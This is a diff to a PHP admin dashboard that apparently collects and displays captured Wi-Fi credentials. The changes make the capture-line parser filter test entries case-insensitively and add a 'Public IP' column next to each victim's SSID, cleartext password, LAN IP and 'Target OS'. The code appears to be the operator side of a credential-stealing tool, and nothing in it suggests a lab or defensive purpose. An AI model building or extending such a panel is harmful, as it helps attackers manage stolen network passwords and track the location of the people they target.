@@ -90,8 +90,8 @@ function parse_capture_line(string $line): ?array {
 
     $ssid = trim($f[2] ?? '');
     $pass = trim($f[3] ?? '');
-    $bad  = ['profile_name','ssid','SSID','IP','OS','Pass','password'];
-    if ($ssid === '' || in_array($ssid, $bad, true) || in_array($pass, ['Pass','password'], true)) return null;
+    $bad  = ['profile_name','ssid','SSID','IP','OS','Pass','password','myssid','test'];
+    if ($ssid === '' || in_array(strtolower($ssid), $bad, true) || in_array(strtolower($pass), ['pass','password','mypass'], true)) return null;
     if ($pass === '') $pass = '(Not Found)';
 
     $ts  = trim($f[0] ?? 'unknown');
@@ -823,6 +823,7 @@ $adminUser = $_SESSION['login_user'];
                     <th>Password</th>
                     <th>Strength</th>
                     <th>LAN IP</th>
+                    <th>Public IP</th>
                     <th>Target OS</th>
                   </tr>
                 </thead>
@@ -836,6 +837,7 @@ $adminUser = $_SESSION['login_user'];
                       <span class="badge <?php echo $c['weak']?'b-inact':'b-act'; ?>"><?php echo $c['weak']?'Weak':'Strong'; ?></span>
                     </td>
                     <td><span style="font-family:'JetBrains Mono',monospace;color:#94a3b8"><?php echo h($c['ip']); ?></span></td>
+                    <td><span style="font-family:'JetBrains Mono',monospace;color:#38bdf8"><?php echo h($c['pub_ip'] ?? 'unknown'); ?></span></td>
                     <td><?php echo h($c['os']); ?></td>
                   </tr>
                   <?php endforeach; ?>
